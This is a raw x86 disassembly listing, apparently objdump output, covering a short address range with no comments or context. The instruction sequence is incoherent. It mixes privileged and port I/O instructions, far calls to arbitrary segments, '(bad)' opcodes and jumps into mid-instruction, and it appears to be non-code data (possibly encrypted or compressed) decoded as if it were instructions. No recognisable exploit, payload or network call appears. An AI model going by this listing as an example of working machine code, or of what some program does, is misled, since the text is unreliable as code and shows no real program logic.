  42ad2c:	fidiv  WORD PTR [ecx-0x18]
  42ad2f:	cmp    al,bl
  42ad31:	mov    ds:0xc47aaf3e,al
  42ad36:	sahf   
  42ad37:	rcl    DWORD PTR [edx],0x4f
  42ad3a:	in     eax,dx
  42ad3b:	call   0xe1a6:0x2b0894dd
  42ad42:	rol    DWORD PTR [ecx+0x29],1
  42ad45:	mov    esi,0x7cf39ff4
  42ad4a:	sahf   
  42ad4b:	add    eax,0xdfd93e7c
  42ad50:	xchg   edx,eax
  42ad51:	pop    ss
  42ad52:	loop   0x42ad76
  42ad54:	sub    edi,eax
  42ad56:	rcr    DWORD PTR [edx-0xd],0x1a
  42ad5a:	xchg   BYTE PTR [edx],cl
  42ad5c:	daa    
  42ad5d:	pushf  
  42ad5e:	ins    DWORD PTR es:[edi],dx
  42ad5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ad60:	pop    esp
  42ad61:	ja     0x42ad0c
  42ad63:	or     eax,DWORD PTR [esi-0xa]
  42ad66:	adc    DWORD PTR [ebx],ecx
  42ad68:	jp     0x42ada7
  42ad6a:	mov    ebp,DWORD PTR [ebp-0x29]
  42ad6d:	jmp    0x42adc8
  42ad6f:	sub    cl,ah
  42ad71:	test   al,0x7e
  42ad73:	mov    al,ds:0xe6d5edd2
  42ad78:	test   eax,0x2cd4bf90
  42ad7d:	scas   eax,DWORD PTR es:[edi]
  42ad7e:	mov    ds:0xb20c7c39,al
  42ad83:	ret    
  42ad84:	jge    0x42ad74
  42ad86:	adc    cl,dh
  42ad88:	mov    ebp,0xd60fd5d
  42ad8d:	repz inc edi
  42ad8f:	xchg   ebp,eax
  42ad90:	and    al,0x9a
  42ad92:	adc    al,0x89
  42ad94:	add    esi,DWORD PTR [edi+0x7f]
  42ad97:	or     ebp,esp
  42ad99:	mov    ds:0x125f05a6,al
  42ad9e:	jle    0x42ad61
  42ada0:	mov    ah,BYTE PTR [esi]
  42ada2:	or     BYTE PTR ds:0xc465306c,al
  42ada8:	bnd jb 0x42ada3
  42adab:	add    DWORD PTR [ebx+edx*2],esi
  42adae:	mov    edi,0x5cb0a780
  42adb3:	dec    ebx
  42adb4:	xor    eax,0x4a20981e
  42adb9:	jo     0x42adbc
  42adbb:	sbb    dl,BYTE PTR [edx]
  42adbd:	lods   eax,DWORD PTR ds:[esi]
  42adbe:	and    eax,0x88ff1820
  42adc3:	fwait
  42adc4:	sar    BYTE PTR [eax+0x62],cl
  42adc7:	gs dec edi
  42adc9:	mov    ecx,0xe6d5bff8
  42adce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42adcf:	ins    DWORD PTR es:[edi],dx
  42add0:	stos   BYTE PTR es:[edi],al
  42add1:	fs xchg esi,eax
  42add3:	pushf  
  42add4:	mov    bh,cl
  42add6:	es mov edx,0x654be09e
  42addc:	rol    dl,0x98
  42addf:	or     al,0x18
  42ade2:	or     BYTE PTR [ebx+0xdb9d2a4],0x75
  42ade9:	cmp    DWORD PTR [esi+0x32],edi
  42adec:	mov    ecx,0x9385f570
  42adf1:	test   BYTE PTR [ecx-0x556bbd14],0x7e
  42adf8:	repz push edx
  42adfa:	loop   0x42ae14
  42adfc:	pop    esi
  42adfd:	loopne 0x42ae36
  42adff:	ins    DWORD PTR es:[edi],dx
  42ae00:	fisttp QWORD PTR [edx-0x44]
  42ae03:	mov    ah,0xe8
  42ae05:	cmp    eax,0xb51f8899
  42ae0a:	jle    0x42add1
  42ae0c:	mov    WORD PTR [ebp-0x41],es
  42ae0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  42ae74:	mov    edi,0x4a8e4af7
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	or     BYTE PTR [ecx+0x30],0xfc
  42ae84:	mov    al,0xca
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    al,0x1
  42ae8a:	add    BYTE PTR [eax],al
  42ae8c:	adc    al,0x41
  42ae8e:	and    eax,0x1d6048ec
  42ae93:	or     DWORD PTR [edx+0x497cd45],ebx
  42ae99:	mov    dh,0x83
  42ae9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae9c:	mov    ah,0x7a
  42ae9e:	xlat   BYTE PTR ds:[ebx]
  42ae9f:	jp     0x42aea7
  42aea1:	jle    0x42aebb
  42aea3:	mov    ch,BYTE PTR [ecx]
  42aea5:	mov    cl,0xb7
  42aea7:	and    DWORD PTR [esi+eiz*1+0x780b81dd],ecx
  42aeae:	jns    0x42ae50
  42aeb0:	loopne 0x42ae50
  42aeb2:	loopne 0x42aea1
  42aeb4:	adc    ch,BYTE PTR [edi+0x75a49e4c]
  42aeba:	push   0x680d91cb
  42aebf:	adc    edx,esp
  42aec1:	mov    ah,0x2
  42aec3:	xchg   ebp,eax
  42aec4:	hlt    
  42aec5:	iret   
  42aec6:	loope  0x42ae59
  42aec8:	sbb    BYTE PTR [esi-0x5a4ca027],ch
  42aece:	aas    
  42aecf:	pop    ds
  42aed0:	das    
  42aed1:	scas   al,BYTE PTR es:[edi]
  42aed2:	sub    al,0x77
  42aed4:	cli    
  42aed5:	outs   dx,DWORD PTR ds:[esi]
  42aed6:	ret    0x7ba9
  42aed9:	(bad)  
  42aeda:	shl    BYTE PTR ds:0x4bdf38cb,cl
  42aee1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42aee2:	cmp    eax,0xd139ff9b
  42aee7:	mov    edx,DWORD PTR [edi+0x40]
  42aeea:	ret    0x3191
  42aeed:	push   ecx
  42aeee:	or     ebp,DWORD PTR [eax]
  42aef0:	sub    al,BYTE PTR [esi+0x12]
  42aef3:	jno    0x42af74
  42aef5:	dec    edi
  42aef6:	xchg   edi,eax
  42aef7:	sbb    eax,0xd7a7b1f5
  42aefc:	daa    
  42aefd:	aas    
  42aefe:	hlt    
  42aeff:	push   es
  42af00:	sub    al,0xe6
  42af02:	or     DWORD PTR [ebx],ebx
  42af04:	in     eax,dx
  42af05:	ss mov dl,bh
  42af08:	cdq    
  42af09:	dec    esp
  42af0a:	leave  
  42af0b:	test   dh,0x4
  42af0e:	fsub   st(2),st
  42af10:	daa    
  42af11:	jae    0x42aebc
  42af13:	dec    edi
  42af14:	add    eax,0x7b298fc0
  42af19:	sbb    al,0xdf
  42af1b:	lods   eax,DWORD PTR ds:[esi]
  42af1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42af1d:	or     DWORD PTR [ecx-0x501e966f],ebp
  42af23:	rep ins DWORD PTR es:[edi],dx
  42af25:	xchg   BYTE PTR [edx-0x30],al
  42af28:	jae    0x42aed2
  42af2a:	outs   dx,DWORD PTR ds:[esi]
  42af2b:	or     ebx,ebx
  42af2d:	lds    ebx,FWORD PTR [esp+edx*8]
  42af30:	aaa    
  42af31:	ja     0x42aeef
  42af33:	call   0xea28b767
  42af38:	mov    dh,0xc8
  42af3a:	mov    al,dl
  42af3c:	jo     0x42aebf
  42af3e:	push   ds
  42af3f:	sub    al,0x1a
  42af41:	sub    ch,dh
  42af43:	sbb    DWORD PTR [esi],edi
  42af45:	into   
  42af46:	add    dh,BYTE PTR [eax+edx*1+0x57a26c00]
  42af4d:	xlat   BYTE PTR ds:[ebx]
  42af4e:	(bad)  
  42af4f:	stc    
  42af50:	jg     0x42af78
  42af52:	ror    ebx,cl
  42af54:	stos   BYTE PTR es:[edi],al
  42af55:	push   edx
  42af56:	mov    ebx,0x4a46e7da
  42af5b:	cmp    ebp,DWORD PTR [esi+0x4b]
  42af5e:	mov    bl,0x4e
  42af60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42af61:	lock inc ebx
  42af63:	bound  esp,QWORD PTR [ebx]
  42af65:	push   ecx
  42af66:	cwde   
  42af67:	jnp    0x42afe8
  42af69:	rcr    DWORD PTR [eax+0x2990e258],1
  42af6f:	adc    BYTE PTR [ebp-0xa89d58f],ah
  42af75:	in     al,0xb1
  42af77:	xchg   WORD PTR [edx-0x36539b11],bp
  42af7e:	push   esp
  42af7f:	add    al,0xa2
  42af81:	js     0x42af18
  42af83:	pop    edi
  42af84:	lahf   
  42af85:	stos   DWORD PTR es:[edi],eax
  42af86:	xchg   edx,eax
  42af87:	out    dx,al
  42af88:	cmp    cl,BYTE PTR [edx-0x5cf6d7c3]
  42af8e:	repz or eax,DWORD PTR [eax]
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	adc    BYTE PTR [esi+0x43],al
  42b003:	mov    al,0xb4
  42b005:	retf   
  42b006:	add    DWORD PTR [eax],eax
  42b008:	add    al,0x1
  42b00a:	add    BYTE PTR [eax],al
  42b00c:	int    0x19
  42b00e:	fdiv   st(0),st
  42b010:	imul   ecx,DWORD PTR [edx+0x258c540],0xffffffb5
  42b017:	push   DWORD PTR [edx]
  42b019:	mov    esp,0x1786848f
  42b01e:	into   
  42b01f:	ret    
  42b020:	inc    eax
  42b021:	mov    WORD PTR [ebp+0x40a6bc1c],ds
  42b027:	retf   
  42b028:	das    
  42b029:	cmp    esi,ebx
  42b02b:	jo     0x42b09a
  42b02d:	ins    BYTE PTR es:[edi],dx
  42b02e:	mov    ch,0x91
  42b030:	lahf   
  42b031:	add    esp,DWORD PTR [esi-0x32]
  42b034:	repz mov ds:0xd4c596d8,eax
  42b03a:	arpl   WORD PTR [eax],si
  42b03c:	scas   eax,DWORD PTR es:[edi]
  42b03d:	xchg   DWORD PTR [edi+0x7e5958a0],eax
  42b043:	and    al,0xbb
  42b045:	or     BYTE PTR fs:[esi],dl
  42b048:	in     al,dx
  42b049:	push   es
  42b04a:	adc    al,0x89
  42b04c:	jnp    0x42b077
  42b04e:	lea    eax,[ecx]
  42b050:	xlat   BYTE PTR ds:[ebx]
  42b051:	js     0x42b0a6
  42b053:	arpl   WORD PTR [ebp+0x5413b59a],di
  42b059:	mov    eax,0xe3e19744
  42b05e:	sbb    ah,BYTE PTR [ebx-0x7d178652]
  42b064:	(bad)  [esi+0x1a]
  42b067:	test   al,0xbc
  42b069:	or     BYTE PTR [ebx],al
  42b06b:	sub    BYTE PTR [ebp+edi*8-0x38],cl
  42b06f:	aam    0xb9
  42b071:	aam    0x98
  42b073:	mov    dh,0xbe
  42b075:	xchg   al,dh
  42b077:	leave  
  42b078:	inc    ebp
  42b079:	outs   dx,DWORD PTR ds:[esi]
  42b07a:	in     al,0x2a
  42b07c:	mov    WORD PTR [ebx+edi*1],fs
  42b07f:	popf   
  42b080:	push   edx
  42b081:	xchg   ecx,eax
  42b082:	popa   
  42b083:	lods   al,BYTE PTR ds:[esi]
  42b084:	and    BYTE PTR [edi+0x56173d1f],dh
  42b08a:	mov    dh,0x98
  42b08c:	add    al,dl
  42b08e:	or     dl,BYTE PTR [eax+eiz*4+0x70]
  42b092:	stos   BYTE PTR es:[edi],al
  42b093:	mov    dh,0xc4
  42b095:	xor    eax,0xe6791613
  42b09a:	std    
  42b09b:	repz out dx,eax
  42b09d:	out    0xab,eax
  42b09f:	out    0x5f,al
  42b0a1:	loope  0x42b0f4
  42b0a3:	sbb    eax,DWORD PTR [ebx*8-0x2c94ae6e]
  42b0aa:	sub    esp,ecx
  42b0ac:	clc    
  42b0ad:	shl    BYTE PTR [esi],cl
  42b0af:	pop    ebp
  42b0b0:	bound  edx,QWORD PTR [esi-0x49]
  42b0b3:	push   ebp
  42b0b4:	sbb    eax,DWORD PTR [edx-0x5cef54d4]
  42b0ba:	mov    edi,cs
  42b0bc:	mov    esp,DWORD PTR [esi+eiz*8+0x13e9a61b]
  42b0c3:	shl    dl,1
  42b0c5:	call   0x852b:0x5f90a746
  42b0cc:	dec    ebx
  42b0cd:	scas   eax,DWORD PTR es:[edi]
  42b0ce:	outs   dx,DWORD PTR ds:[esi]
  42b0cf:	imul   esi,DWORD PTR [eax-0xf],0xe9a142f0
  42b0d6:	mov    dl,0xad
  42b0d8:	popa   
  42b0d9:	mov    ?,WORD PTR [ecx+0x16]
  42b0dc:	pop    ecx
  42b0dd:	dec    DWORD PTR [esi-0x5627fb76]
  42b0e3:	jecxz  0x42b0af
  42b0e5:	mov    ?,WORD PTR [eax+edx*8]
  42b0e8:	jmp    0x61d858e2
  42b0ed:	dec    edx
  42b0ee:	or     dl,bl
  42b0f0:	dec    edi
  42b0f1:	fstp   DWORD PTR [ecx-0x76]
  42b0f4:	push   cs
  42b0f5:	fdiv   QWORD PTR [edx+0x272aec7b]
  42b0fb:	sbb    eax,DWORD PTR [ebx-0x4870e062]
  42b101:	mov    cl,ch
  42b103:	push   ecx
  42b104:	mov    edx,0xb8b044b2
  42b109:	mov    BYTE PTR [edx-0x20a2301e],bl
  42b10f:	pushf  
	...
  42b174:	jne    0x42b19b
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	pop    esp
  42b181:	mov    ebx,0xccb8f2b6
  42b186:	add    DWORD PTR [eax],eax
  42b188:	add    al,0x1
  42b18a:	add    BYTE PTR [eax],al
  42b18c:	pushf  
  42b18d:	adc    ah,BYTE PTR [ecx+0x2a]
  42b190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b191:	les    esp,FWORD PTR [ecx]
  42b193:	and    ebx,DWORD PTR [edi+0x582d9f3c]
  42b199:	push   0x735c33b2
  42b19e:	pop    ss
  42b19f:	addr16 or al,0x17
  42b1a3:	cmp    dl,BYTE PTR [ebx+0x17]
  42b1a6:	or     dl,BYTE PTR [eax]
  42b1a8:	leave  
  42b1a9:	ret    0x74d2
  42b1ac:	popf   
  42b1ad:	scas   al,BYTE PTR es:[edi]
  42b1ae:	jns    0x42b22d
  42b1b0:	xchg   edi,eax
  42b1b1:	imul   ebp,ebx,0x2695b3b4
  42b1b7:	int3   
  42b1b8:	stos   BYTE PTR es:[edi],al
  42b1b9:	jbe    0x42b212
  42b1bb:	(bad)  
  42b1bc:	jb     0x42b180
  42b1be:	or     DWORD PTR [esi-0x9],0xb354be56
  42b1c5:	adc    eax,DWORD PTR [ebx-0x64486cd2]
  42b1cb:	dec    ebx
  42b1cc:	ds je  0x42b1e6
  42b1cf:	enter  0x7ac,0x60
  42b1d3:	fnsave es:[ebx+0x37bf7b06]
  42b1da:	outs   dx,BYTE PTR ds:[esi]
  42b1db:	sub    eax,0x6640b633
  42b1e0:	pop    ebx
  42b1e1:	test   dh,cl
  42b1e3:	adc    ah,dh
  42b1e5:	dec    esi
  42b1e6:	xor    edi,0x7e
  42b1e9:	imul   ebx,DWORD PTR [edx+0x6d],0xffffff9b
  42b1ed:	xor    DWORD PTR [edi-0x319619ed],edi
  42b1f3:	cwde   
  42b1f4:	repnz (bad) 
  42b1f6:	lods   eax,DWORD PTR ds:[esi]
  42b1f7:	push   ebx
  42b1f8:	and    cl,cl
  42b1fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b1fb:	retf   
  42b1fc:	inc    esp
  42b1fd:	mov    al,0x7d
  42b1ff:	xchg   ecx,eax
  42b200:	xchg   DWORD PTR fs:[edx-0x246dff48],esi
  42b207:	imul   ebp,DWORD PTR [edi+0xf],0xffffffd0
  42b20b:	mov    BYTE PTR [edx-0xa98dfa6],bl
  42b211:	cs cdq 
  42b213:	mov    bl,0xec
  42b215:	add    ecx,DWORD PTR [edx-0x16]
  42b218:	adc    ebx,DWORD PTR [ebx+0x9]
  42b21b:	lea    edx,[esi+0x24]
  42b21e:	sub    ebx,edx
  42b220:	repnz pop edx
  42b222:	(bad)  
  42b223:	sahf   
  42b224:	sar    DWORD PTR [edx+0xe],1
  42b227:	push   esi
  42b228:	pop    eax
  42b229:	(bad)  
  42b22b:	inc    ebp
  42b22c:	cmp    bl,dh
  42b22e:	push   ds
  42b22f:	cmp    al,0xda
  42b231:	xchg   esp,eax
  42b232:	push   cs
  42b233:	call   0x17db:0x4b506f8e
  42b23a:	loopne 0x42b1e9
  42b23c:	push   DWORD PTR [edx-0x7e1ef6b4]
  42b242:	in     eax,0x68
  42b244:	xchg   BYTE PTR [edx],cl
  42b246:	and    al,0x73
  42b248:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b249:	pop    edx
  42b24a:	xlat   BYTE PTR ds:[ebx]
  42b24b:	push   ds
  42b24c:	icebp  
  42b24d:	mov    dl,0x9d
  42b24f:	ins    BYTE PTR es:[edi],dx
  42b250:	dec    ebx
  42b251:	sbb    DWORD PTR [ecx],esp
  42b253:	add    DWORD PTR [ecx-0x59],0x8ac238ff
  42b25a:	xchg   ebp,eax
  42b25b:	out    dx,al
  42b25c:	cmp    ch,BYTE PTR [eax-0x34200ccf]
  42b262:	adc    eax,0x53d6fd3
  42b267:	ja     0x42b28a
  42b269:	sbb    DWORD PTR [esi+0x19],eax
  42b26c:	lea    bx,[eax]
  42b26f:	fwait
  42b270:	jae    0x42b226
  42b272:	sbb    al,0xf4
  42b274:	dec    esp
  42b275:	sti    
  42b276:	mov    ch,0x4e
  42b278:	jb     0x42b203
  42b27a:	rcr    BYTE PTR [esp+edi*8+0x22],1
  42b27e:	into   
  42b27f:	mov    ch,0x32
  42b281:	popa   
  42b282:	arpl   WORD PTR [edx-0x23],bx
  42b285:	aam    0xe2
  42b287:	cmp    ch,ah
  42b289:	sbb    DWORD PTR [ebx+0x5c],edi
  42b28c:	mov    ch,0xfc
  42b28e:	inc    edi
  42b28f:	add    al,BYTE PTR [eax]
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x68738e65
  42b301:	mov    esi,0x1cdbcdf
  42b307:	add    BYTE PTR [ecx+eax*1],al
  42b30a:	add    BYTE PTR [eax],al
  42b30c:	dec    BYTE PTR [ebx]
  42b30e:	sti    
  42b30f:	sti    
  42b310:	inc    edx
  42b311:	arpl   WORD PTR [edx],dx
  42b313:	push   cs
  42b314:	js     0x42b38d
  42b316:	add    edi,edi
  42b318:	jb     0x42b38f
  42b31a:	lods   eax,DWORD PTR ds:[esi]
  42b31b:	or     bh,BYTE PTR [esi]
  42b31d:	bound  edx,QWORD PTR [edi+0x2070106]
  42b323:	push   ss
  42b324:	jne    0x42b38f
  42b326:	js     0x42b363
  42b328:	cdq    
  42b329:	bound  esp,QWORD PTR [eax]
  42b32b:	movntq QWORD PTR [edi+0x2e],mm6
  42b32f:	shr    BYTE PTR [eax],0xe6
  42b332:	or     esp,DWORD PTR [ecx+0x1b]
  42b335:	sbb    bl,BYTE PTR [eax+0x1b3b24cd]
  42b33b:	ret    0x8cb7
  42b33e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b33f:	pop    esp
  42b340:	retf   
  42b341:	adc    BYTE PTR [esi-0x5810fbb1],bh
  42b347:	and    edi,DWORD PTR [esi+0x16]
  42b34a:	enter  0xd5fe,0xbb
  42b34e:	fcomp  QWORD PTR [edi]
  42b350:	adc    eax,0x8d96043a
  42b355:	daa    
  42b356:	imul   ecx,DWORD PTR [eax-0x58],0xcdff46ba
  42b35d:	es mov edi,0x9f88e2fa
  42b363:	mov    ds:0x108c2edc,al
  42b368:	xor    eax,0xbf4c240f
  42b36d:	loop   0x42b380
  42b36f:	pop    eax
  42b370:	mov    eax,0x99f10bb3
  42b376:	pop    esp
  42b377:	mov    al,ds:0xc2df8ad7
  42b37c:	dec    ebp
  42b37d:	cmp    eax,0x685bd075
  42b382:	or     BYTE PTR [edi-0x685cfe38],dh
  42b388:	bound  ecx,QWORD PTR [ebp-0x272c3bf9]
  42b38e:	mov    DWORD PTR [ebx+0x9843fe1],edi
  42b394:	stos   BYTE PTR es:[edi],al
  42b395:	icebp  
  42b396:	cmp    ah,BYTE PTR [edx-0x12cd2b60]
  42b39c:	and    ah,BYTE PTR [esi]
  42b39e:	ds or  al,0xe8
  42b3a1:	cmc    
  42b3a2:	mov    dh,BYTE PTR [ebx-0x120d30dd]
  42b3a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b3a9:	and    dh,ch
  42b3ab:	out    dx,eax
  42b3ac:	mov    al,ah
  42b3ae:	and    al,0x83
  42b3b0:	ret    
  42b3b1:	aad    0xed
  42b3b3:	pop    edx
  42b3b4:	loopne 0x42b42f
  42b3b6:	pop    edi
  42b3b7:	out    0x5,eax
  42b3b9:	cmp    eax,0xe9b9539
  42b3be:	(bad)  
  42b3bf:	mov    ebx,0x985b5cf2
  42b3c4:	dec    esi
  42b3c5:	xor    eax,0x5c3aa919
  42b3ca:	mov    al,ds:0x4fc8aa8e
  42b3cf:	mov    edx,eax
  42b3d1:	mov    al,ds:0xa2de417f
  42b3d6:	mov    ch,BYTE PTR [ebx+0x40]
  42b3d9:	and    BYTE PTR [edi+ecx*2],0x9d
  42b3dd:	or     BYTE PTR [bx+di-0x7478],bh
  42b3e2:	xor    DWORD PTR [edi-0x611b45ed],ebp
  42b3e8:	inc    eax
  42b3e9:	push   ds
  42b3ea:	mov    ah,0xe3
  42b3ec:	mov    bl,0xce
  42b3ee:	retf   
  42b3ef:	inc    ebx
  42b3f0:	jle    0x42b42e
  42b3f2:	call   0xa6c6de0d
  42b3f7:	jno    0x42b3ac
  42b3f9:	mov    ebx,0xf7be3b00
  42b3fe:	ret    0xe1bd
  42b401:	dec    edi
  42b402:	outs   dx,DWORD PTR ds:[esi]
  42b403:	mov    al,0x58
  42b405:	inc    ebx
  42b406:	mov    dh,0x8f
  42b408:	sar    edx,cl
  42b40a:	and    DWORD PTR [esi+0x33ca5022],ebp
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [ecx],esi
  42b481:	jae    0x42b4a9
  42b483:	ds ror dh,0x1
  42b487:	add    BYTE PTR [ecx+eax*1],al
  42b48a:	add    BYTE PTR [eax],al
  42b48c:	outs   dx,DWORD PTR ds:[esi]
  42b48d:	inc    ecx
  42b48e:	push   ds
  42b48f:	xchg   ecx,eax
  42b490:	int    0xfd
  42b492:	mov    ebp,DWORD PTR [esi]
  42b494:	add    eax,0xa7ce26b2
  42b499:	sub    BYTE PTR [ecx-0x74],al
  42b49c:	js     0x42b508
  42b49e:	test   al,0x21
  42b4a0:	cmp    eax,0x891c5338
  42b4a5:	cmp    BYTE PTR [ecx],0xbb
  42b4a8:	xor    al,0xac
  42b4aa:	push   ds
  42b4ab:	or     BYTE PTR [esi+0x7cbaf6c1],dl
  42b4b1:	jg     0x42b476
  42b4b3:	retf   
  42b4b4:	or     bl,al
  42b4b6:	ror    BYTE PTR [edx-0x38],1
  42b4b9:	rcr    DWORD PTR [ebx-0x425433eb],cl
  42b4bf:	mov    DWORD PTR [ebx-0x7e22729d],ecx
  42b4c5:	inc    edx
  42b4c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b4c7:	(bad)  
  42b4c8:	mul    cl
  42b4ca:	cmp    bl,BYTE PTR [eax]
  42b4cc:	(bad)  
  42b4cd:	and    DWORD PTR [edi+0x4edbae2b],esi
  42b4d3:	ret    
  42b4d4:	add    esp,DWORD PTR [ecx-0x7811b5d0]
  42b4da:	mov    edx,0x585866ac
  42b4df:	sbb    cl,dh
  42b4e1:	retf   
  42b4e2:	push   ecx
  42b4e3:	fiadd  WORD PTR [ebx+0x5fc90ff8]
  42b4e9:	mov    esp,0xb135e59e
  42b4ee:	adc    edx,DWORD PTR [ecx]
  42b4f0:	fnsave [edi-0x313c3d7b]
  42b4f6:	inc    ebx
  42b4f7:	std    
  42b4f8:	dec    eax
  42b4f9:	(bad)  
  42b4fa:	jbe    0x42b55f
  42b4fc:	jecxz  0x42b497
  42b4fe:	mov    bh,0x81
  42b500:	jmp    0x79c9ca73
  42b505:	inc    esp
  42b506:	or     eax,esi
  42b508:	xor    BYTE PTR [edi+esi*8],0x50
  42b50c:	shl    DWORD PTR [ecx+ebx*8],0xc
  42b510:	test   BYTE PTR [esi-0xf],bh
  42b513:	out    dx,al
  42b514:	add    BYTE PTR [edi-0x5],ah
  42b517:	inc    ecx
  42b518:	nop
  42b519:	mov    dh,0x62
  42b51b:	xor    edi,DWORD PTR [ecx-0x12bc4cad]
  42b521:	lea    esp,[esi]
  42b523:	ins    DWORD PTR es:[edi],dx
  42b524:	add    al,0x5
  42b526:	and    BYTE PTR [esi+0x2f731295],dl
  42b52c:	xchg   BYTE PTR [ebx+0x2bdbbe2f],dl
  42b532:	inc    ecx
  42b533:	cmp    DWORD PTR [eax-0x56c1284a],esp
  42b539:	iret   
  42b53a:	je     0x42b577
  42b53c:	xor    eax,0x1e33e573
  42b541:	and    DWORD PTR [esp+edx*4],0x70
  42b545:	or     al,0x8d
  42b547:	les    edi,FWORD PTR [eax*4-0x3d3a1d1e]
  42b54e:	daa    
  42b54f:	dec    ebx
  42b550:	jp     0x42b55d
  42b552:	and    al,0x43
  42b554:	popf   
  42b555:	fs and edx,edx
  42b558:	mov    bl,0x89
  42b55a:	xchg   esi,eax
  42b55b:	jns    0x42b4f1
  42b55d:	adc    BYTE PTR [edi-0x3caf4eab],dh
  42b563:	sbb    DWORD PTR [esi-0x7],esp
  42b566:	xchg   esi,eax
  42b567:	fst    QWORD PTR [ecx-0x36d35b3c]
  42b56d:	jmp    0x42b4f7
  42b56f:	mov    cs,WORD PTR [esi+edx*4]
  42b572:	call   0x1fd946a0
  42b577:	cmp    BYTE PTR [eax+0x34568375],0x51
  42b57e:	outs   dx,DWORD PTR ds:[esi]
  42b57f:	sbb    eax,0x45128782
  42b584:	jae    0x42b531
  42b586:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b587:	push   ebp
  42b588:	dec    esp
  42b589:	add    BYTE PTR [eax-0x1517676a],0x56
	...
  42b5f4:	loopne 0x42b58a
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	mov    ch,0x76
  42b602:	outs   dx,DWORD PTR ds:[esi]
  42b603:	jns    0x42b5c9
  42b605:	iret   
  42b606:	add    DWORD PTR [eax],eax
  42b608:	add    al,0x1
  42b60a:	add    BYTE PTR [eax],al
  42b60c:	pop    ecx
  42b60d:	mov    al,ds:0x9ef21ff2
  42b612:	xchg   ebx,eax
  42b613:	jae    0x42b65f
  42b615:	mov    dh,0xe9
  42b617:	jne    0x42b673
  42b619:	pop    esp
  42b61a:	mov    bh,0x1d
  42b61c:	daa    
  42b61d:	adc    DWORD PTR [ecx-0x7d],esp
  42b620:	sub    DWORD PTR [ebp-0xc],ebp
  42b623:	or     al,BYTE PTR ds:0x5735b630
  42b629:	and    eax,0x8dea1a6a
  42b62e:	jp     0x42b68f
  42b630:	inc    ecx
  42b631:	repz cld 
  42b633:	xchg   esi,eax
  42b634:	cmp    al,BYTE PTR [esi+edx*1+0x2a]
  42b638:	mov    ecx,0x89a372cf
  42b63d:	pop    ebp
  42b63e:	iret   
  42b63f:	shl    BYTE PTR [esi-0x785d8949],cl
  42b645:	pop    ebp
  42b646:	cmp    al,BYTE PTR [ecx+0x4]
  42b649:	pop    ds
  42b64a:	adc    eax,0x2d0d6873
  42b64f:	(bad)  
  42b651:	lods   eax,DWORD PTR ds:[esi]
  42b652:	into   
  42b653:	sub    BYTE PTR [edi-0x3afaeb7d],bl
  42b659:	sub    eax,0x275f80dc
  42b65e:	mov    bh,0x82
  42b660:	mov    ds:0x721481be,al
  42b665:	xchg   esp,eax
  42b666:	ds idiv dh
  42b669:	add    eax,0x848e7c75
  42b66e:	int    0xab
  42b670:	addr16 int 0x64
  42b673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b674:	out    0x6b,eax
  42b676:	pop    esi
  42b677:	jecxz  0x42b652
  42b679:	or     ch,BYTE PTR ds:0xd292b45a
  42b67f:	jge    0x42b659
  42b681:	cmp    esp,DWORD PTR [ebx]
  42b683:	inc    eax
  42b684:	icebp  
  42b685:	repz inc esi
  42b687:	sub    BYTE PTR [edi+0x76ba7247],bl
  42b68d:	inc    ecx
  42b68e:	scas   al,BYTE PTR es:[edi]
  42b68f:	mov    eax,0x1696f6e
  42b694:	inc    eax
  42b695:	std    
  42b696:	add    BYTE PTR [esi+0x53595751],dl
  42b69c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b69d:	std    
  42b69e:	inc    ecx
  42b69f:	js     0x42b67c
  42b6a1:	sbb    BYTE PTR [ebx-0x588b6284],bh
  42b6a7:	inc    eax
  42b6a8:	mov    edx,0xfaa06798
  42b6ad:	mov    bl,0xef
  42b6af:	cmp    ch,0x79
  42b6b2:	sbb    ch,BYTE PTR [edx]
  42b6b4:	fsubr  st,st(2)
  42b6b6:	mov    eax,0x83fba881
  42b6bb:	mov    ebx,DWORD PTR [ecx]
  42b6bd:	jl     0x42b70d
  42b6bf:	and    esi,DWORD PTR [edx]
  42b6c1:	fwait
  42b6c2:	dec    eax
  42b6c3:	ret    
  42b6c4:	add    BYTE PTR [eax+0x64fba520],dl
  42b6ca:	adc    bl,cl
  42b6cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6cd:	xor    cl,BYTE PTR [ebx+eax*4-0x47]
  42b6d1:	adc    BYTE PTR [edx+0x540c447a],0x9b
